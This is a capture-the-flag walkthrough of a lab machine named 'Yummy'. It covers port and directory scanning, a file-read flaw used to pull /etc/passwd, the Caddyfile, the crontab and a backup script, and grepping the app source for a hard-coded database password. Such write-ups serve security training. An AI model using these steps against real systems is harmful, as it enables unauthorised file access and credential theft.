![image](https://github.com/user-attachments/assets/abfb1789-0846-443a-bd89-64da26241e02)


## 1. Recon

### 1.1. Port Scan `nmap`

Quick initial scan to find open ports:

```console
root@kali:~# nmap -sS -p- --min-rate 100000 -Pn 10.10.11.36
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 09:43 +08
Warning: 10.10.11.36 giving up on port because retransmission cap hit (10).
Nmap scan report for yummy.htb (10.10.11.36)
Host is up (0.0049s latency).
Not shown: 65147 closed tcp ports (reset), 386 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.26 seconds
```

Script and version scan on open ports:

```console
root@kali:~# nmap -Pn -p 22,80 -sCV 10.10.11.36
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 09:44 +08
Nmap scan report for yummy.htb (10.10.11.36)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 (ECDSA)
|_  256 bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 (ED25519)
80/tcp open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: Yummy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

2. Exploring the web application at `80`

```console
root@kali:~# gobuster dir -u http://10.10.11.36:80 -b 403,404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.36:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 6893]
/register             (Status: 200) [Size: 7816]
/book                 (Status: 200) [Size: 39296]
/logout               (Status: 302) [Size: 199] [--> /login]
/dashboard            (Status: 302) [Size: 199] [--> /login]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

![image](https://github.com/user-attachments/assets/ca141cd8-2f6c-4051-9cde-dcc5a990f6b1)

![image](https://github.com/user-attachments/assets/51b237e5-48df-4bdf-bcb9-ee0476f0605a)

![image](https://github.com/user-attachments/assets/8fa606d5-68ff-493f-b28c-37863ea6d57b)

![image](https://github.com/user-attachments/assets/4a96db95-360a-4112-9be6-0067bd259c67)

![image](https://github.com/user-attachments/assets/e43bb04c-9934-48ef-9fbb-ae4128ae0163)

![image](https://github.com/user-attachments/assets/507d880c-9d77-4ad5-8ab9-ccee8c68bcac)

![image](https://github.com/user-attachments/assets/29366386-2b0e-462f-94ed-19c7ad0b04c7)

![image](https://github.com/user-attachments/assets/a3bed0fc-1ea9-428a-9b43-7fa010b9de12)

![image](https://github.com/user-attachments/assets/08464918-b0f0-4a46-a487-dc1141214f24)

Response header:

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=passwd
Content-Length: 2033
Content-Type: application/octet-stream
Date: Thu, 09 Jan 2025 06:04:55 GMT
Etag: "1727686952.3123646-2033-950406498"
Last-Modified: Mon, 30 Sep 2024 09:02:32 GMT
Server: Caddy
```

`/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dev:x:1000:1000:dev:/home/dev:/bin/bash
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
caddy:x:999:988:Caddy web server:/var/lib/caddy:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
qa:x:1001:1001::/home/qa:/bin/bash
_laurel:x:996:987::/var/log/laurel:/bin/false
```

![image](https://github.com/user-attachments/assets/ccbca404-72d8-49b3-adaa-ba09f451dca9)

`/etc/caddy/Caddyfile`:

```
:80 {
    @ip {
        header_regexp Host ^(\d{1,3}\.){3}\d{1,3}$
    }
    redir @ip http://yummy.htb{uri}
    reverse_proxy 127.0.0.1:3000 {
    header_down -Server  
    }
}
```

![image](https://github.com/user-attachments/assets/5a9554a9-bc1b-444f-8491-8caa5a3788bc)

`/etc/crontab`:

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh
```

![image](https://github.com/user-attachments/assets/27cb445c-b6ea-4999-b23b-69afc500d9d9)

`/data/scripts/app_backup.sh`:

```
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app
```

![image](https://github.com/user-attachments/assets/e8c11025-a6a1-4725-b56e-5e9a68e66df1)

Looks like the `backupapp.zip` contains the entire `/opt/app` directory:

```console
root@kali:~/opt/app# ls -l
total 32
-rw-r--r-- 1 root root 11979 Sep 25 21:54 app.py
drwxr-xr-x 3 root root  4096 Sep 30 16:16 config
drwxr-xr-x 3 root root  4096 Sep 30 16:16 middleware
drwxrwxr-x 2 root root  4096 Sep 30 16:16 __pycache__
drwxr-xr-x 6 root root  4096 Sep 30 16:16 static
drwxr-xr-x 2 root root  4096 Sep 30 16:16 templates
```

Looking for `password` in the files in this directory quickly found something:

```console
root@kali:~/opt/app# grep password ./*
./app.py:    'password': '3wDo7gSRZIwIHRxZ!',
./app.py:        password = request.json.get('password')
./app.py:        password2 = hashlib.sha256(password.encode()).hexdigest()
./app.py:        if not email or not password:
./app.py:            return jsonify(message="email or password is missing"), 400
./app.py:                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
./app.py:                cursor.execute(sql, (email, password2))
./app.py:                    return jsonify(message="Invalid email or password"), 401
./app.py:            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
./app.py:            if not email or not password:
./app.py:                return jsonify(error="email or password is missing"), 400
./app.py:                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
./app.py:                        cursor.execute(sql, (email, password, role_id))
grep: ./config: Is a directory
grep: ./middleware: Is a directory
grep: ./__pycache__: Is a directory
grep: ./static: Is a directory
grep: ./templates: Is a directory
```

Found: database connection credentials:

```console
root@kali:~/opt/app# cat app.py
⋮
db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS

}
⋮
```
